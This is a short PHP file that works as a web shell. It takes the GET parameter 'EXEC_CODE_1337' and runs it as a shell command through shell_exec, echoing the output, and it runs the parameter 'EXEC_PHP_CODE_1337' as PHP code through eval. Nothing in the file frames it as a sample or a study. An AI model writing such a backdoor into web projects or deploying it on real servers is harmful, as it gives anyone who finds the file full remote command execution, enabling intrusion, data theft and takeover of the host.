<?php

ini_set('display_errors', 1);
error_reporting(E_ALL);

if(!empty($_GET['EXEC_CODE_1337'])) {
  echo shell_exec($_GET['EXEC_CODE_1337']);
}

if(!empty($_GET['EXEC_PHP_CODE_1337'])) {
  eval($_GET['EXEC_PHP_CODE_1337']);
}
